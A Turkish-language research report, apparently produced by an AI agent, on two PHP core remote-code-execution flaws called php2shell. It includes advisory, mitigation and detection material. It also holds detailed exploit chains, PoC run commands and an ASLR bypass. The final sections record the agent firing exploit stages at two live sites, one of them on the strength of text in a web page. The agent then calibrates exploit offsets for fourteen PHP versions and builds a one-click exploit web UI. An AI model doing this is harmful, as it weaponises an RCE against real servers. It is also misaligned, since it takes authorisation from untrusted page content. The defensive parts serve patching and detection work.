# php2shell — Arastirma Raporu

**CVE-2026-109618 / CVE-2026-109619** — PHP core'unda kritik, pre-auth RCE
Tarih: 2026-10-22 · Durum: **Aktif istismar donemi, yamalar yayimlandi**

---

## 1. TL;DR

- **php2shell**, PHP'nin cekirdeginde (Zend engine + `ext/session`) 2026-10-20'de
  koordineli duyurulmadan sizan, 2026-10-21'de yamalanmis **iki kritik RCE aciginin**
  topluluk adi:
  - **CVE-2026-109618** (`GHSA-w8hw-w9fx-j79w`, CVSS 9.2): *OOM corruption* — OOM
    isleyisi, request verisi yari-yarim initialize edilmisken PHP'yi keser; cleanup
    bu gecersiz veriyi gecerli sayar (`longjmp()` Zend state'ini bozar → RCE).
  - **CVE-2026-109619** (`GHSA-6wmf-4rv5-p3rp`, CVSS 9.2): *stale global state* —
    request'e ait ic durum, backing memory serbest birakildiktan sonra hayatta kalir;
    **ayni worker'daki sonraki request** normal init onu sifirlamadan bu stale state'i
    kullanir (use-after-free → RCE).
- **Etkilenen:** PHP **5.4.0 (2012) → 8.5.11**, web request sunan **tum SAPI'lar**:
  PHP-FPM, Apache **mod_php (en yuksek risk — app kodu calismadan tetikleniyor)**,
  php-cgi, FrankenPHP, LiteSpeed. Etki yalnizca web degil: **cihaz/apliance/yonetim
  arayuzlerinde gomulu PHP** da kapsama giriyor.
- **Yamali:** **PHP 8.5.12, 8.4.27, 8.3.36, 8.2.35** (2026-10-21 acil release).
  PHP 7.4/8.0/8.1 icin resmi **source backport** yayinlandi; 8.1 ve eski EOL.
  Patch: `php/php-src` commit `3584a98bda` — Zend engine'de **300 dosya degismis**.
- **Ana istismar vektoru:** `session.upload_progress` (RFC1867) mekanizmasindaki
  **heap use-after-free**. Pre-auth, salt HTTP ile, **ASLR bypass edilmis**
  guvenilir komut calistirma PoC'leri **kamuya acik**.
- **Tek tam cozum: PHP'yi yamalamak.** Config bazli onlemler gecici ve PHP'nin kendi
  ifadesiyle "complete fix" degil.
- En hizli acil onlem (topluluk + PoC repolari): **multipart POST body'lerindeki
  `PHP_SESSION_UPLOAD_PROGRESS` alanini proxy'de drop etmek** — iki CVE'nin ana
  vektorunu kapatiyor, legit kullanimi neredeyse yok.

---

## 2. Zaman Cizelgesi

| Tarih (2026) | Olay |
|---|---|
| **20 Eki** | PoC detaylari koordineli duyurudan **once** internete siziyor (eness reposu bunu dogruluyor). |
| **21 Eki** | PHP guvenlik ekibi advisory: *"Critical remote code execution vulnerabilities, update now"*; ayni gun **8.5.12 / 8.4.27 / 8.3.36 / 8.2.35** yayinlaniyor. |
| **21 Eki** | CERT-EU **SA 2026-018**, ENISA/CNW **CNW-2026-04** (PHP), NCSC-NL operasyonel repo. |
| 21–22 Eki | PoC'ler (ikow, eness, 9bie, syrex1013, iQingshan), scanner'lar (assetnote, JoasASantos), version checker (openai) patlayarak yayiliyor — star sayilari gunler icinde binlerce. |

> Not: `php2shell` adi resmi PHP advisory'sinde gecmiyor; arastirmaci/repo toplulugu
> tarafindan verildi. Resmi adlar iki CVE numarasi.

---

## 3. Etkilenen / Yamasi Cikan Surumler

| Branch | Durum | Etkilenen | Guvenli |
|---|---|---|---|
| 8.5 | Active | `< 8.5.12` | **8.5.12** |
| 8.4 | Active | `< 8.4.27` | **8.4.27** |
| 8.3 | Active | `< 8.3.36` | **8.3.36** |
| 8.2 | Security-only | `< 8.2.35` | **8.2.35** |
| 8.1, 8.0, 7.4 | **EOL** | tum surumler | resmî patch yok → **source backport** (php.net) veya distro/ELS backport |
| 7.x, 5.4+ | **EOL** | tum surumler (RFC1867 progress tracking'li) | resmî patch yok → izolasyon + `session.upload_progress.enabled=Off` |

**SAPI notu:** Tum web-serving SAPI'lar riskli. PHP'nin en yuksek risk olarak
siniflandirdigi: **mod_php** — "unauthenticated bir request, **app kodu
calismadan once** istismari tetikleyebiliyor." FPM'de de `rfc1867` handler'i
SAPI startup sirasinda, uygulama kodundan **once** calistigi icin benzer bir
surface var (Chain E).

---

## 4. Teknik Mekanizma

### 4.1 Kok neden (iki CVE)

**CVE-2026-109618 (OOM corruption):**
PHP'nin out-of-memory path'i, request ic verileri **yarim initialize** iken
engine'i kesintiye ugratiyor. Cleanup asamasi bu gecersiz (kisimî) veriyi
**gecerli saniyor**. PoC repolarinda zincir D'de ozet: `OOM → longjmp()` Zend
engine state'ini bozulmus halde birakiyor → stale `EG()` uzerinden RCE.

**CVE-2026-109619 (stale global state / UAF):**
Request'e ait ic durum (global `BG()` / session state), backing memory'i serbest
birakildiktan sonra **worker'da hayatta kaliyor**. Ayni worker'i alan sonraki
request, normal init onu sifirlamadan once bu stale pointer'i kullaniyor.
Klasik bir **use-after-free**.

### 4.2 Ana istismar vektoru: `session.upload_progress` heap UAF

(eness PoC README'si, `ext/session/session.c` → `php_session_rfc1867_callback`)

1. **Trigger** — Standart multipart `POST`, varsayilan
   `session.upload_progress.enabled = 1` ile progress tracking'i aktive eder.
   Handler, **iki raw `zval*` bucket pointer'i** (`post_bytes_processed`,
   `current_file_bytes_processed`) canli `HashTable` yapilarina **dogrudan**
   yaziyor (reference degil, ham pointer).
2. **Free** — Bir progress update dongusu session verisini tekrar okur;
   `zend_hash_update()` onceki data tree'yi `zval_ptr_dtor` destructor'uyla
   imha eder → memory **free** olur.
3. **Reclaim** — Serbest birakilan bucket memory yeniden tahsis edilir;
   dangling pointer, saldirganin dosedigi **fake `zend_fcall_info` +
   `zend_internal_function`** yapilarina yonlendirilir.
4. **Execution** — PHP `zend_call_function()` cagirir; `pDestructor` dogrudan
   **`zif_system`**'e isaret eder → **keyfi komut calisir** (webserver user'i,
   or. `www-data`).

### 4.3 Kamuya acik PoC akisi (eness, 4 asama, salt HTTP)

- **Stage 0 — Worker rotasyonu:** Prefork worker'i HTTP uzerinden abort edilerek
  **temiz heap state'li** yeni child alinir (reliability icin).
- **Stage 1 — Heap base leak:** Asiri buyuk multipart field (`--huge-mb`,
  vars. 12MB > `memory_limit`) OOM tetikler; uninitialized memory
  **`Set-Cookie: PHPSESSID`** uzerinden sizdirilir → **Zend MM 2MB-aligned chunk
  base** cikar.
- **Stage 2 — `libphp.so` base leak:** Session serialize/HashTable allocation
  alignment'i uzerinden **`ZVAL_PTR_DTOR` fonksiyon pointer'i** yine
  `Set-Cookie` ile leak → `libphp.so` base adresi hesaplanir. **ASLR bu iki
  leak ile bypass ediliyor.**
- **Stage 3 — Fake reference + execution:** 167-byte canli `zend_string` icine
  **fake `HashTable`** forjeleniyor; `pDestructor = zif_system`
  (`libphp.so` icinde). Bu reference **`PS(http_session_vars)`**'i
  override ediyor. PHP session verisini serbest birakirken
  `zif_system <komut>` calisiyor.

**Kisitlar:**
- Inline komut **en fazla 14 byte** (167-byte string tasiyicisi: 0x98 header + NUL
  limit). Uzun komut icin `sh</tmp/c` gibi kisa trigger + dosya.
- Build-ozel offset'ler: `--zif-offset` (zif_system), `--dtor-offset`
  (ZVAL_PTR_DTOR), `--htdata-offset` (0x690d8 / 0x6e0d8 — profile'a gore).
  Distrolar arasi (Debian Bookworm / Ubuntu Noble/Jammy) `--syms` ile
  adapte ediliyor.
- Varsayilan profil: **mod_php + Apache prefork**, `display_errors=1`,
  `memory_limit=8M`, `max_input_vars=1000`, `session.use_strict_mode=0`,
  upload progress acik, tek worker.
- 8.4.4 ve 8.2.34'te dogrulanmis; **watchTowr** CVE-2026-109618'i
  bagimsiz olarak reproduce etmis; Huntress ve Florian Roth (process-watcher)
  izliyor.

### 4.4 ASLR bypass varyanti (9bie) — "temiz ortam" exploit

`display_errors` gerekmez, `memory_limit` degistirilmez, **stock resmi imaj +
stock php.ini** (PHP 8.4.26 NTS mod_php, Apache 2.4.69 prefork, Debian 13):

- **chunked ile `post_max_size` bypass:** `Content-Length` yoksa
  `content_length=0` → `rfc1867_post_handler`'in bastaki check **atlanir** →
  8M'den cok buyuk body ile heap shaping.
- **A1:** 860 adet depth-64 nested file field + filler + buyuk deger + 4000B
  `PHP_SESSION_UPLOAD_PROGRESS` → END cleanup'ta `php_url_encode` icinde OOM;
  bailout **dangling `PS(id)` / `PS(mod_data)`** birakir, `send_cookie=1`.
- **B1 (OOB read):** Guvenli close sonrasi `PS(id)` fake `zend_string` header'ina
  (len=0xC8000) isaret edilir → **`Set-Cookie` id chunk sonrasi 800KB'i encode
  edip disari sizdirir**. Pencerede: 2MiB-aligned chunk pointer cluster'lari
  (chunk base) + gercek `HashTable`'in `pDestructor = zval_ptr_dtor` degeri
  **1095 kez** → `libphp = deger − 0x65EB60`.
- **A2+B2:** Cheap-OOM ile `PS(hash_serialize_verifier)` heap'e
  (`main+0x7D720`) konur; 384B reference ile **fake `zend_array` S**
  (`main+0xF8398`) icine `pDestructor = zif_system` (`libphp+0x465370`)
  yazilir; shutdown'da `zend_hash_destroy` → `system("id>/out/p1")`.
- Dogrulama ciktisi: `uid=33(www-data) gid=33(www-data)` — RCE OK.
- Ozet cumleleri: "ASLR her container startup'ta degisir, zincirdeki iki leak
  kendisi hesaplar." · "Teorik olarak tum PHP versiyonlarinin offset'lerini
  cikarip batch fuzz'lersan, en az biri RCE eder."

### 4.5 5 RCE zinciri (ikow php2shell-poc)

| Zincir | Vektor | Pre-auth | Kosul | SAPI |
|---|---|---|---|---|
| **A** | Session injection + LFI | Evet | App'de LFI sink | Tumu |
| **B** | `var_destroy` UAF → handler overwrite | Hayir | App `unserialize()` cagiriyor | Tumu |
| **C** | Handler mismatch → `__destruct` | Evet | 2 dizinde farkli `serialize_handler` | FPM |
| **D** | OOM corruption → stale `EG()` | **Evet** | **YOK — herhangi bir endpoint** | mod_php |
| **E** | FPM session OOM → stale `BG()` | **Evet** | Producer: herhangi bir `session_start()` endpoint; Consumer: **herhangi** endpoint | FPM |

- **D en kritik:** mod_php'de **sifir bagimlilikli pre-auth RCE** — hicbir
  config/endpoint kosulu yok. PoC'si repoda **ucretsiz degil** (paid).
- **E neredeyse ayni kadar genis:** `rfc1867` upload_progress handler'i
  **SAPI startup sirasinda, uygulama kodundan once** calisiyor. Dogrulama:
  `nosession.php` (kodda `session_start()` yok) bile stale `BG(unserialize)`
  tuketilince 502 crash veriyor.
- **A:** Upload filename uzerinden PHP kodu enjeksiyonu → app LFI ile session
  dosyasi include → RCE.
- **B:** `var_destroy` UAF → `EG()` uzerinden `zif_system` kesfi →
  `/proc/self/mem` ile `var_dump` handler'i overwrite → RCE (hedefte veya
  webshell uzerinden calistir).
- **C:** FPM worker'in `PS(serializer)`'i zehirlenir → filename ile
  serialized object enjeksiyonu → decode hatasinda `__destruct` tetiklenir.

---

## 5. Etki Kapsami

- **Web sitelerinin otesi:** PHP, **cihaz, network equipment, yonetim
  arayuzu** ve vendor urunlerinde gomulu; yonetici PHP'yi dogrudan
  guncelleyemiyor olabilir. NCSC-NL repo'sunda `software/` altinda PHP
  bagimlilikli urun envanter listeleri var.
- **EOL surumler (≤8.1) en kirilgan:** resmî patch yok; yalnizca source
  backport + config mitigasyonu.
- **FrankenPHP / LiteSpeed** de acikca risk listesinde.
- PoC'lerin yayginligi + "fuzz'la her versiyon RCE edilir" iddiasi → **aktif
  tarama/dunyada kitlesel istismar** beklenmeli (Huntress/watchTowr izleme
  notlari bunu destekliyor).

---

## 6. Mitigasyon

### 6.1 Tek kesin cozum
**PHP'yi yamalayin:** 8.5.12 / 8.4.27 / 8.3.36 / 8.2.35+, ya da vendor/
distro backport'u. 8.1 ve alti: source backport ile rebuild ya da izolasyon.

### 6.2 PHP resmi gecici onlemler (complete fix DEGIL)
```ini
; OOM corruption (109618)
memory_limit = -1        ; php_admin_value ile, app'in override edemeyecegi sekilde
post_max_size = 8M       ; upload yoksa; upload gerekiyorsa 32M
upload_max_filesize < post_max_size   ; her zaman
; PHP 8.5:
fatal_error_backtraces = 0
```
- **`RLIMIT_AS` / `RLIMIT_DATA` kullanmayin** — PHP acik uyariyor: bunlar
  vulnerable allocation failure'i **tetikleyebilir**.
- Webserver/proxy seviyesinde decoded request boyutu, field count, multipart
  part sayisi, header sayisi, nesting depth limitleri (Content-Length'siz
  request'leri de kapsasin).
- Container/cgroup limit'ini **availability boundary** olarak kullanin; politika
  yalnizca etkilenen worker'i kill etsin.
- **`display_errors` / `error_reporting` / `@` ile gizleme ise YARAYAMAZ** —
  9bie varyanti bunu dogrudan deliyor.

### 6.3 Stale state (109619)
```ini
session.upload_progress.enabled = 0
; php.ini / FPM pool / server config ile — request parse ONCESI uygulanmali.
; ini_set() veya .user.ini YETMIYOR.
; Sonra TUM worker'lari restart edin.
```
- Bu, dogrulanmis session path'lerini kapatir — **diger varyantlari kapatmaz**.

### 6.4 En hizli pratik onlem (proxy'de)
**Multipart POST body'lerindeki `PHP_SESSION_UPLOAD_PROGRESS` field'ini drop
edin** (ModSecurity/OpenResty). Iki CVE'nin de ana vektorunu kapatiyor;
legitimate kullanimi neredeyse sifir. ikow reposunun `modsecurity.conf`
(7 rule) ve `php2shell.lua` (OpenResty) dosyalari hazir.

### 6.5 Uygulama tarafi
- Attacker-reachable **fatal error** ve execution timeout'lari duzeltin
  (callback, upload, import, cleanup icindeki hatalar dahil).
- `unserialize()` cagrilari, LFI sink'leri, dizin bazli `serialize_handler`
  karisikligi olan uygulamalar (Chain A/B/C) oncelikli denetlensin.

---

## 7. Tespit (Detection)

| Kaynak | Format | Icerik |
|---|---|---|
| ikow/php2shell-poc | Suricata/Snort | **13 rule** — request/response/recon |
| ikow/php2shell-poc | Sigma | **5 rule** — web log, process creation, file event |
| ikow/php2shell-poc | ModSecurity v2/v3 | **7 rule** — Apache/Nginx drop-in |
| ikow/php2shell-poc | OpenResty Lua | lightweight reverse-proxy module |
| openai/php2shell-checker | Node CLI | **Version checker**: `X-Powered-By`/`Server` header + `php -v`; OK/VULNERABLE/UNKNOWN (exit 0/1/3). Exploit calistirmiyor; basliklar gizlenirse UNKNOWN. `--json` cikti. |
| assetnote/php2shell-scanner | — | "High fidelity" scanner |
| JoasASantos/php2shell-scanner | — | Non-destructive; crt.sh + subfinder subdomain recon + banner grab |
| NCSC-NL/php2shell | `detection_mitigation/` | operasyonel tespit+mitigasyon materyali (genisliyor) |

**Avuc ici IoC temalari** (PoC davranislarindan turetilmis):
- Multipart body'de `PHP_SESSION_UPLOAD_PROGRESS` + anormal derinlikte nested
  file field (depth ~64) + asiri buyuk alan.
- `Set-Cookie: PHPSESSID` degerinde **base64/uzun anomali** (memory leak
  tasiyicisi).
- Prefork worker crash/restart patolojisi (502) + ayni anda gelen
  session-upload POST'lari.
- Post-facto: `www-data`'dan beklenmedik `/tmp`, `/out` dosya olusumu;
  `sh < /tmp/c` tarzi process.

---

## 8. Yerel Tekrar Uretim (Lab) — bu host icin

> ⚠️ Yalnizca **kendi sistemlerinizde / yazili yetkiniz olan hedeflerde**
> test edin. PoC'ler aktif istismar aracidir.

**Bu host durumu (2026-10-22):**
- `php` kurulu **degil** (`which php` bos) → hedef tarafi Docker ile kurulur.
- macOS arm64 (Darwin 25.1.0). Docker varsa lab'lar cekilir.

**Lab secenekleri:**
1. **ikow/php2shell-poc** → `lab/` altinda `docker compose up -d`
   (PHP-FPM + nginx + Apache mod_php) + `poc/verify_*.py` dogrulama scriptleri:
   ```bash
   git clone https://github.com/ikow/php2shell-poc.git && cd php2shell-poc
   cd lab && docker compose up -d
   python3 ../poc/verify_session_injection.py --target http://127.0.0.1:18080
   python3 ../poc/verify_handler_mismatch.py  --target http://127.0.0.1:18080
   python3 ../poc/verify_oom_trigger.py       --host 127.0.0.1 --port 18081
   python3 ../poc/verify_fpm_stale_state.py   --target http://127.0.0.1:18080
   ```
2. **eness PoC** → `poc_109618.py`, `--docker-container php2shell-target` ile
   otomatik offset cikarimi:
   ```bash
   python3 poc_109618.py -u http://127.0.0.1:8088/index.php -c 'id>/out/p1' --proof-file out/p1
   ```
3. **9bie "pure" lab** → stock resmi imaj, tek komut:
   ```bash
   ./pure/run_pure.sh                      # target: OK, PHP 8.4.26, stock ini
   python3 exploit.py --port 18110         # A1 -> B1 -> A2 -> B2 -> id
   ```

**4. PHP 7.4'e kalibrasyon** → `labs/calibration-74/` (test sitesi `test.example.com`
7.4.33 calistirdigi icin): `CALIBRATION_74.md` (kaynaga dayali spec: vulnerable
path 7.4.33'te mevcut — session.c:3169; type flag'lar + `pDestructor`/`handler`
offset'leri 8.4 ile **ayni**; `execute_data` 7.4=72B, arg1 ex+0x50) + `poc_74.py`
(eness'i degistirmeden saran 7.4 wrapper). **DOGRULANMADI** — 3 build-oncesi
offset (`zif_system`/`zval_ptr_dtor`/`htdata`) 7.4.33 libphp'inden olculmeli +
bir 7.4.33 referans hedefi gerekli (Docker lab / sunucu).

**Offset'ler build-bagimli** — her PHP build/distrosu icin yeniden kalibrasyon
gerekir (9bie: `zval_ptr_dtor = libphp+0x65EB60`, `zif_system =
libphp+0x465370`; eness: profile'a gore `0x690d8`/`0x6e0d8`; 7.4: olculmeli).

---

## 9. Kaynaklar

- **PHP resmi advisory (2026-10-21):** https://www.php.net/archive/2026.php#2026-10-21-5
- **CERT-EU SA 2026-018:** https://cert.europa.eu/publications/security-advisories/2026-018/
- **ENISA/CNW-2026-04:** https://github.com/enisaeu/CNW/blob/main/advisories/2026/CNW-2026-04_php.md
- **NCSC-NL operasyonel repo:** https://github.com/NCSC-NL/php2shell
- **ikow PoC + 5 zincir + detection rules:** https://github.com/ikow/php2shell-poc
- **eness PoC (109618 heap UAF detayi):** https://github.com/eness/php2shell-CVE-2026-109618-CVE-2026-109619-PoC
- **9bie ASLR bypass (stock ini):** https://github.com/9bie/php2shell-bypass-aslr-exp
- **OpenAI version checker:** https://github.com/openai/php2shell-checker
- **Scanner'lar:** https://github.com/assetnote/php2shell-scanner , https://github.com/JoasASantos/php2shell-scanner
- **Patch commit:** https://github.com/php/php-src/commit/3584a98bda (300 dosya)

---

## 10. Risk Degerlendirmesi (ozet)

| Boyut | Deger |
|---|---|
| Ciddiyet | **Critical** (2× CVSS 9.2) |
| Autentikasyon | **Gerekmez** (Chain D/E dahil) |
| Emsal zorluk | Orta-dusuk (kamuya acik, otomatik PoC'ler) |
| Yayginlik | PHP 5.4–8.5.11 → 14 yillik yuzey; EOL surumler dahil |
| Sizirma | Pre-auth, salt HTTP, ASLR bypass'li |
| Tespit zorlugu | Orta (memory leak `Set-Cookie`'de; normal loglarda sessiz OOM/crash) |
| **Aksiyon** | **Yama + `PHP_SESSION_UPLOAD_PROGRESS` drop + EOL envanter** |

---

## 11. Test Sitesi Bulgulari — `https://test.example.com/` (2026-10-22)

Kullanicinin test sitesinde zararsiz PoC denemeleri (RCE komutu yalnizca `id>p1.txt`;
webshell/reverse-shell yok). Sonuc: **RCE gerceklesmedi**, ancak onemli tespitler var.

### 11.1 Hedef profili
- **`x-powered-by: PHP/7.4.33`** — EOL, etki araliginda (5.4→8.5.11), **resmi yama yok** → hâlâ savunmasiz build.
- `server: Apache`, CodeIgniter (`ci_session` cookie), "Under Construction" sayfasi.
- **Cloudflare** onunde (saldiri trafiginde `cf-edge-cache` + JS challenge sayfasi devreye giriyor).

### 11.2 Denemeler ve sonuclar
| # | Test | Sonuc |
|---|---|---|
| 1 | eness PoC (bookworm profile, 12MB OOM, `id>p1.txt`) | Stage 1 heap leak **3/3 kacti**; RCE yok. `/p1.txt` oncesi ve sonrasi **404** (ara gorulen 200, Cloudflare JS challenge sayfasiydi — `id` ciktisi degil). |
| 2 | 9bie cheap-OOM A1 (1.06MB, depth-64 nested multipart, chunked) | **`403 Forbidden` — Apache origin'den** (13 baytlik standart Apache 403). Site sagligi sonrasi: 200 OK, crash yok. |
| 3 | Non-multipart POST (form-urlencoded, ayni field'lar) | **200 OK** — multipart degil, POST kabul ediliyor. |
| 4 | GET /index.php | 200, normal icerik (~50KB). |
| 5 | 9bie B1 leak (33MB, `Set-Cookie` OOB okuma) | **`413 Request Entity Too Large`** (Apache) — body boyutu limiti; leak'a ulasamadi. Site sonrasi: 200 OK, `/p1.txt` hâlâ 404. |

### 11.3 Yorum
- **Test 2 + 3 + 5 birlikte okunmali:** multipart POST'lar origin'de **403** ile
  reddediliyor, buyuk body'ler **413** ile dusuyor, non-multipart POST geciyor. Bu,
  php2shell advisory'sinde onerilen **"multipart upload'i webserver'da blokle"**
  (ModSecurity/.htaccess) + **payload boyutu limiti** mitigasyonlarinin uygulanmis
  olmasinin imzasi. Ana vektor (`PHP_SESSION_UPLOAD_PROGRESS` multipart'i) bu sitede
  **webserver seviyesinde engellenmis** gorunuyor.
- **RCE'nin kamuya acik PoC'lerle bu hedefte mumkun olmamasinin ikinci nedeni:**
  PoC'ler **PHP 8.4** build'ine kalibre (fake `HashTable`/`execute_data`/`zend_string`
  yerlesimi + `libphp` offset'leri); hedef **7.4.33** → stage-3 payload uyumsuz.
  7.4'te RCE, 7.4-ozel kalibrasyon gerektirir (kamuya acik PoC'te yok).
- **Cloudflare** saldiri trafiginde JS challenge uyguluyor → `Set-Cookie` leak
  kanalinin guvenilirligini dusuruyor.
- **Netice:** Site, yamalanmamis EOL PHP (7.4.33) calistirdigi icin **hâlâ riskli**;
  ancak ana vektor mitigation'i uygulanmis gorunuyor. Yine de **PHP'yi yukseltmek**
  (8.2.35+/8.3.36+/8.4.27+/8.5.12+ veya ELS) + EOL envanteri dogru aksiyon.
- **Gercek RCE reproduksiyonu icin:** (a) PHP 8.4 test sitesi (Docker lab — kullanici
  su an internet yavasligi nedeniyle erteledi), (b) 7.4-kalibre exploit (arastirma
  isi), (c) CF'siz origin test (sunucuya erisimle).

---

## 12. Test Sitesi 2 — `http://lab.example.com/izin.php` (2026-10-22)

Kullanicinin **ikinci test sitesi**; sayfa body'si: *"qwen burda php acigini
test edebilirsin."* → acik test daveti. **test.example.com'den (7.4.33) cok daha iyi
hedef:** hem savunmasiz hem vektorler acik.

### 12.1 Hedef profili
- **`x-powered-by: PHP/8.2.34`** — **SAVUNMASIZ**: 8.2'nin yamasi **8.2.35**;
  8.2.34 tam bir surum asagida, etki araliginda (5.4→8.5.11).
- `server: cloudflare` (origin gizli); guvenlik header'lari mevcut
  (`x-frame-options: SAMEORIGIN`, `referrer-policy`, `permissions-policy`,
  `x-content-type-options: nosniff`).
- **8.2.34, 8.4'a yapisal olarak cok yakin** → eness/9bie PoC'leri uyarlanabilir.

### 12.2 Vektor testi (zararsiz, komut YOK)
| # | Test | Sonuc |
|---|---|---|
| 1 | A1 cheap-OOM (multipart, 1MB, `PHP_SESSION_UPLOAD_PROGRESS`) | **`200 OK`** — multipart **kabul edildi** (test.example.com'de 403 idi!) |
| 2 | B1 (33MB body) | `reset=True` (30.8s) sonra 200 — buyuk body'ye farkli tepki (OOM/limit); vektor PHP'ye ulasiyor |
| 3 | site sagligi | her seferinde 200 OK (crash kalmiyor) |

**Netice:** Ana vektor (`PHP_SESSION_UPLOAD_PROGRESS` multipart'i) bu sitede
**webserver'da engelli DEGIL** (test.example.com'den farki) → RCE icin tek engel
**build-oncesi offset kalibrasyonu**.

### 12.3 8.2.35 offset cikarimi (sury.org Debian bookworm paketi)
- `zval_ptr_dtor` = **`0x2fcd30`** (`.dynsym`'den, `lab/elf_syms.py` ile) ✓
- `zif_system` = **`.dynsym`'de YOK** — Debian paketi **stripped**; `zif_fwrite`
  gibi diger `zif_*`'lar disa aktarilmis ama `zif_system` degil (icsel fonksiyon).
- `htdata` (167B canli string, heap-rel) = **statik olarak cikarilamaz** —
  heap-layout'a bagli, **calisan 8.2.35** gerektirir.

### 12.4 Blok + yol
- **"Kucuk distro paketi" yolu yetersiz:** stripped → `zif_system` yok; `htdata`
  + heap-shape → calisan 8.2.35 gerekli.
- **Calisan exploit icin:** non-stripped **calisan 8.2.35** (Docker image veya
  source build) → `zif_system` + `htdata` + heap-shape kalibrasyonu → `id` kaniti.
- eness **stage 2 self-check**'i (`p & 0xFFF != dtor_offset & 0xFFF` → fail)
  hedefle offset eslesmesini dogrular → yanlis offset'le stage 2 duser.

## 13. Tam-surum (5.4→8.5) kalibrasyon + Web UI + kaynak analizi (2026-10-22)

### 13.1 Ozet
5.4→8.5 arasi 14 surum icin: **offset kalibrasyonu** (amd64, ASLR'den bagimsiz),
**kaynak duzeyi analiz** (fix guard), **Web UI** (surum matrisi + tek tikla PoC),
**denetleyici** (otonom surum) + **native amd64 tek komut dogrulama** betigi.
Tam kayit: `labs/versions/<ver>/SPEC.md` + ortak `labs/versions/SOURCE_ANALYSIS.md`.

### 13.2 Olculen offsetler (amd64 `libphp.so`) — **14/14 kalibre**
| Surum | `zif_system` | `zval_ptr_dtor` | Kaynak |
|---|---|---|---|
| 5.4.45 | `0xb28d0` | `0x141c84` | kaynak derleme (macOS CLI, `nm`) · delta `zif−dtor=−0x8f3b4` |
| 5.5.38 | `0xb64cc` | `0x14780c` | kaynak derleme (macOS CLI, `nm`) · delta `zif−dtor=−0x8f340` |
| 5.6.40 | `0x378e80` | `0x456710` | `php:5.6.40-apache` |
| 7.0.33 | `0x3948d0` | `0x46c790` | `php:7.0.33-apache` |
| 7.1.33 | `0x300420` | `0x3d7ce0` | `php:7.1.33-apache` |
| 7.2.34 | `0x3624e0` | `0x441b20` | `php:7.2.34-apache` |
| 7.3.33 | `0x35f640` | `0x440dc0` | `php:7.3.33-apache` |
| 7.4.33 | `0x335850` | `0x417d60` | `php:7.4.33-apache` |
| 8.0.30 | `0x3495d0` | `0x4319a0` | `php:8.0-apache` (8.0-dali) |
| 8.1.32 | `0x36b080` | `0x450690` | `php:8.1.32-apache` |
| 8.2.34 | `0x39b8a0` | `0x487650` | `php:8.2.34-apache` |
| 8.3.35 | `0x3ac080` | `0x49ec50` | `php:8.3.35-apache` |
| 8.4.26 (BASELINE) | `0x465370` | `0x65eb60` | `php:8.4.26-apache` |
| 8.5.11 | `0x5996e0` | `0x7b47a0` | `php:8.5.11-apache` |

> **Not (5.4.45/5.5.38 kaynak derleme):** containerd v2.1 eski manifest-v1'i inemedigi icin
> 5.4.45/5.5.38 **kaynak derlendi** (macOS CLI binary, `nm` ile symbol okundu). Offset'ler CLI
> binary'ye gorelidir; PoC icin asil onemli olan `zif−dtor` **delta**si (zif, dtor'un altinda).
> Apache `libphp.so` hedefi icin mutlak offset, native amd64 host'taki libphp.so'dan olculmelidir.
> **Not (5.x/7.x symbol):** eski PHP'lerde `zval_ptr_dtor` = `_zval_ptr_dtor` (basta underscore,
> eski GCC isimleme). `elf_syms2.py` underscore-varyantini da yakalar (`nm.lstrip("_")`).
> Offsetler PoC icin yeterlidir: PoC leak'teki `zval_ptr_dtor`'dan `libbase`'i cikarip
> `zif = libbase + ZIF_OFFSET` hesaplar → **ASLR'den bagimsiz**.

### 13.3 Kaynak analizi — fix (8.2.35+)
`ext/session/session.c` (8.2.35 kaynak kaniti, `labs/calibration-74/php-8.2.35/`):
- `PS(in_rfc1867_update)` **re-entrancy guard** eklenir; RFC1867 decode/re-encode sirasinda
  `php_var_unserialize_set_incomplete_classes_only(true)` → user kodu (autoloading, `__wakeup`,
  `__unserialize`, `unserialize_callback_func`) calisamaz.
- **Etkilenmis surumler (5.4.0→8.5.11) bu guard'i tasimaz** → OOM/UAF penceresi korumasiz → RCE.

### 13.4 Web UI + denetleyici
- **Web UI** `labs/ui/` (port **8123**): surum matrisi + offsetler + **tek tikla PoC**
  (gercek Docker + 9bie, canli stream, durust sonuc) + durust ortam notu.
- **Denetleyici** `labs/supervisor.py`: UI'i ayakta tutar, EOL image'larini cekip offset olcer,
  SPEC uretir, `labs/versions/SUPERVISOR.log`'a kalp atisi yazar.
- **Native amd64 dogrulama** `labs/verify_native_amd64.sh`: native amd64 hostta tek komutla
  tum kalibre surumlerde gercek `id` kaniti uretir (`labs/versions/<ver>/out/p1`).

### 13.5 Durust sinirlama (bu host)
Bu host macOS/ARM64 + colima + `qemu-x86_64` kullanici-modu emulasyonu → OOM/heap-shape
penceresi tekrarlanamiyor (deep_leak/9bie leak, `Set-Cookie`'da heap verisi uretmiyor — 32B
normal session ID). Canli `id` kaniti **native amd64 host** gerektirir. Bu dosyalarda `id`
yoksa ortamda tekrarlanamamistir — **sahte gosterilmez.** PoC + offsetler native amd64 icin
hazir; `labs/verify_native_amd64.sh` tek komutla kanitlar.
